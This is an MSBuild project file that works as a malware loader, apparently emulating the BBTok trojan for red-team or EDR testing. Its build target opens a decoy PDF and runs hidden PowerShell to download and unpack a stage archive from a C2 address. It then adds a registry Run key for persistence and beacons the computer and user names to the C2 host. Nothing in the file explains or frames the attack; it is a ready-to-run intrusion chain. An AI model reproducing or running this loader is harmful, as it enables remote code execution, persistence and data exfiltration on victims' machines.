<Project ToolsVersion="4.0" DefaultTargets="EDRChain" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <KaliIP>10.99.156.47</KaliIP>
    <C2Port>8080</C2Port>
    <WorkDir>C:\ProgramData\BBTok</WorkDir>
  </PropertyGroup>

  <Target Name="EDRChain">
    <Exec Command="start &quot;%~dp0decoy.pdf&quot;" IgnoreExitCode="true" />
    <Exec Command="powershell.exe -NoP -W Hidden -Command &quot;[System.Threading.Mutex]::new($false,'BBTok_Mutex') | Out-Null&quot;" />
    <Exec Command="cmd.exe /c mkdir &quot;$(WorkDir)&quot;" IgnoreExitCode="true" />
    <Exec Command="powershell.exe -NoP -W Hidden -Command &quot;[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr 'http://$(KaliIP):$(C2Port)/stage.zip' -OutFile $env:TEMP\stage.zip -UseBasicParsing&quot;" />
    <Exec Command="powershell.exe -NoP -W Hidden -Command &quot;if (Test-Path $env:TEMP\stage.zip) { try { Expand-Archive -LiteralPath $env:TEMP\stage.zip -DestinationPath '$(WorkDir)' -Force } catch { Add-Type -A System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory($env:TEMP+'\stage.zip','$(WorkDir)') } }&quot;" />
    <Exec Command="reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v BBTok /t REG_SZ /d &quot;rundll32.exe url.dll,FileProtocolHandler http://$(KaliIP):$(C2Port)/persist&quot; /f" />
    <Exec Command="rundll32.exe url.dll,FileProtocolHandler http://$(KaliIP):$(C2Port)/beacon?host=%COMPUTERNAME%&amp;user=%USERNAME%" />
  </Target>
</Project>






